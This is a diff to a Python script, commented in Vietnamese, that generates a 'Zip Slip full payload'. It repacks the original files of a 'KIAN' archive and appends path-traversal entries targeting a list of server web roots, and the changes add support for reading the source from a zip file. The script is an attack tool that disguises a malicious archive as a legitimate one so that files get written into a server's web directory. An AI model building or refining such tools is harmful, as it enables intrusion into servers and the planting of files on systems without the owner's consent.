@@ -36,16 +36,33 @@ DEFAULT_WEBROOTS = [
 ]
 
 
-def collect_source_files(source_dir: str) -> list[tuple[str, str]]:
-    """Trả về list (arc_name, abs_path) của tất cả file trong source_dir."""
+def collect_source_files_from_dir(source_dir: str) -> list[tuple[str, bytes]]:
     result = []
     for dirpath, _, filenames in os.walk(source_dir):
         for fname in filenames:
             abs_path = os.path.join(dirpath, fname)
-            # arc_name là path tương đối từ source_dir, dùng forward slash
             rel = os.path.relpath(abs_path, source_dir).replace("\\", "/")
-            result.append((rel, abs_path))
+            with open(abs_path, "rb") as fh:
+                result.append((rel, fh.read()))
     return result
+
+
+def collect_source_files_from_zip(zip_path: str) -> list[tuple[str, bytes]]:
+    result = []
+    with zipfile.ZipFile(zip_path, "r") as src:
+        for item in src.infolist():
+            if not item.is_dir():
+                result.append((item.filename, src.read(item.filename)))
+    return result
+
+
+def collect_source_files(source: str) -> list[tuple[str, bytes]]:
+    """Đọc file gốc từ thư mục hoặc file .zip thực sự."""
+    if os.path.isdir(source):
+        return collect_source_files_from_dir(source)
+    if os.path.isfile(source) and source.lower().endswith(".zip"):
+        return collect_source_files_from_zip(source)
+    return []
 
 
 def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
@@ -62,20 +79,18 @@ def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
     return entries
 
 
-def generate(source_dir: str, output: str, webroots: list[str]):
-    source_files = collect_source_files(source_dir)
+def generate(source: str, output: str, webroots: list[str]):
+    source_files = collect_source_files(source)
     traversal_entries = build_traversal_entries(webroots)
 
-    print(f"[*] Source files     : {len(source_files)} files từ {source_dir}")
+    print(f"[*] Source files     : {len(source_files)} files từ {source}")
     print(f"[*] Traversal entries: {len(traversal_entries)} variants")
     print(f"[*] Output           : {output}\n")
 
     with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
 
         # 1. Copy toàn bộ file gốc
-        for arc_name, abs_path in source_files:
-            with open(abs_path, "rb") as f:
-                data = f.read()
+        for arc_name, data in source_files:
             zf.writestr(zipfile.ZipInfo(arc_name), data)
 
         # 2. Thêm entry path traversal
@@ -119,7 +134,9 @@ for path in CHECK_PATHS:
 
 
 def main():
-    default_source = r"C:\Users\Lenovo\Downloads\KIAN 2.0.3.zip"
+    # Tìm kian.zip cùng thư mục với script
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    default_source = os.path.join(script_dir, "kian.zip")
 
     parser = argparse.ArgumentParser(description="Zip Slip full payload — copy KIAN gốc + path traversal")
     parser.add_argument("--source",  default=default_source,
@@ -130,11 +147,14 @@ def main():
                         help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
     args = parser.parse_args()
 
-    if not os.path.isdir(args.source):
-        print(f"[ERR] Source dir không tồn tại: {args.source}")
-        print(f"      Dùng --source để chỉ định đúng đường dẫn.")
+    is_dir  = os.path.isdir(args.source)
+    is_zip  = os.path.isfile(args.source) and args.source.lower().endswith(".zip")
+    if not is_dir and not is_zip:
+        print(f"[ERR] Không tìm thấy source: {args.source}")
+        print(f"      Truyền --source với đường dẫn đến thư mục hoặc file .zip gốc của KIAN.")
         raise SystemExit(1)
 
+    print(f"[*] Mode: {'directory' if is_dir else 'zip file'}")
     webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
     generate(args.source, args.output, webroots)
 
